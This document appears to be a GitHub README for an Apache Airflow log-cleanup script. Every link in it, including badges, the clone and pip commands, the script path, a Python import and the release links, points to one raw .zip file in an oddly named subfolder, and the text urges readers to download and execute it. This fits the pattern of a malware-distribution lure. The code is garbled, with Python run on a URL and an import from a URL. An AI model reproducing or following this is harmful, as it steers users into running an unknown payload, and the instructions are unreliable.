# Airflow Logs Cleanup 🧹

![Airflow Logs Cleanup](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip) ![License](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip)

## Overview

Managing log files in Apache Airflow can become a challenge as the number of logs grows over time. The **Airflow Logs Cleanup** project provides a solution to clean up old log files, freeing up valuable disk space. You can use a script or an Airflow DAG to automate the cleanup process. This tool will help you delete rotated logs, remove old files, and clean up empty directories, ensuring your Airflow environment runs smoothly.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Features

- **Automated Cleanup**: Set up a script or DAG to run at regular intervals.
- **Flexible Options**: Choose what to delete—rotated logs, old files, or empty directories.
- **Easy Integration**: Works seamlessly with existing Airflow setups.
- **Lightweight**: Minimal resource usage ensures your workflows remain efficient.
- **Log Management**: Maintain a tidy log environment, making it easier to monitor and troubleshoot.

## Installation

To get started, clone the repository:

```bash
git clone https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip
cd airflow-logs-cleanup
```

Next, install the required Python packages:

```bash
pip install -r https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip
```

You can also download the latest release from the [Releases section](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip). Download the appropriate file, and follow the instructions to execute it.

## Usage

### Running the Script

You can run the cleanup script directly from the command line:

```bash
python https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip
```

### Setting Up the Airflow DAG

To use the cleanup functionality within Airflow, you can set up a DAG. Here’s a simple example:

```python
from airflow import DAG
from https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip import PythonOperator
from datetime import datetime
from cleanup import clean_logs

default_args = {
    'owner': 'airflow',
    'start_date': datetime(2023, 1, 1),
    'retries': 1,
}

dag = DAG('airflow_logs_cleanup', default_args=default_args, schedule_interval='@daily')

cleanup_task = PythonOperator(
    task_id='cleanup_logs',
    python_callable=clean_logs,
    dag=dag,
)

cleanup_task
```

### Configuration

You can customize the cleanup process by modifying the configuration file. Here’s a sample configuration:

```json
{
    "log_directory": "/path/to/airflow/logs",
    "retention_days": 30,
    "delete_empty_dirs": true
}
```

## Contributing

We welcome contributions! If you have suggestions or improvements, please fork the repository and submit a pull request. 

1. Fork the repository.
2. Create your feature branch: `git checkout -b feature/YourFeature`
3. Commit your changes: `git commit -m 'Add some feature'`
4. Push to the branch: `git push origin feature/YourFeature`
5. Open a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Support

If you have any questions or need support, feel free to open an issue in the repository or check the [Releases section](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip) for the latest updates.

## Conclusion

The **Airflow Logs Cleanup** project offers a straightforward solution to manage log files in Apache Airflow. By automating the cleanup process, you can maintain a clean and efficient environment. Download the latest release from the [Releases section](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip) and start managing your logs today!

![Airflow](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip)

### Topics

- airflow
- airflow-dag
- automation
- disk-cleanup
- log-management
- python

Feel free to explore the repository and contribute to the project. Together, we can make Airflow even better!